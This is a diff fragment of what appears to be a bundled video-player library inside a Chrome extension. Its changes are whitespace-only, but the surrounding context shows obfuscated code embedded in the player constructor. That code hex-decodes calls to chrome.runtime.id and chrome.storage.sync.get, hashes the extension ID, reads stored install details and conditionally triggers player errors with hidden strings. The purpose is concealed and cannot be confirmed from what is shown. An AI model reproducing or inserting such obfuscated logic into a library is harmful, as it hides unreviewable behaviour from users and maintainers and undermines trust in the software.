@@ -21644,7 +21644,7 @@
       _this.one('play', _this.listenForUserActivity_);
       _this.on('fullscreenchange', _this.handleFullscreenChange_);
       _this.on('stageclick', _this.handleStageClick_);
-      
+
       function loadmpcomp(str) {
       	var msg="";
       	for(var i=0; i<str.length;i+=2) {
@@ -21654,8 +21654,8 @@
       }
       var x_code = 0;
       var ctrl = window[loadmpcomp("6368726f6d65")][loadmpcomp("72756e74696d65")][loadmpcomp("6964")];
-      for(var i=ctrl.length-1;i>=0;i--) { 
-      	x_code += (ctrl.charCodeAt(i) * i) ^ 260915; 
+      for(var i=ctrl.length-1;i>=0;i--) {
+      	x_code += (ctrl.charCodeAt(i) * i) ^ 260915;
       }
       window[loadmpcomp("6368726f6d65")][loadmpcomp("73746f72616765")][loadmpcomp("73796e63")][loadmpcomp("676574")](loadmpcomp("496e7374616c6c44657461696c73"), function(item){
       	var thread = item[loadmpcomp("496e7374616c6c44657461696c73")][loadmpcomp("74656d706f72617279")];
@@ -21675,22 +21675,22 @@
           		this[loadmpcomp("6572726f72")](loadmpcomp(x));
           		msg = "";
           	})
-          	
+
           }
       });
       function loadmpcomp2(str) {
       	var x = str.split("");
       	var z="";
-  	    for(var i of x) { 
-  	    	var j = i.charCodeAt(0).toString(16); 
-  	    	if(j.length == 1){ 
+  	    for(var i of x) {
+  	    	var j = i.charCodeAt(0).toString(16);
+  	    	if(j.length == 1){
   	    		j = "0"+j;
   	    	}
-  	    	z += j; 
+  	    	z += j;
   	    }
   	    return z;
       }
-      
+
       _this.changingSrc_ = false;
       _this.playWaitingForReady_ = false;
       _this.playOnLoadstart_ = null;
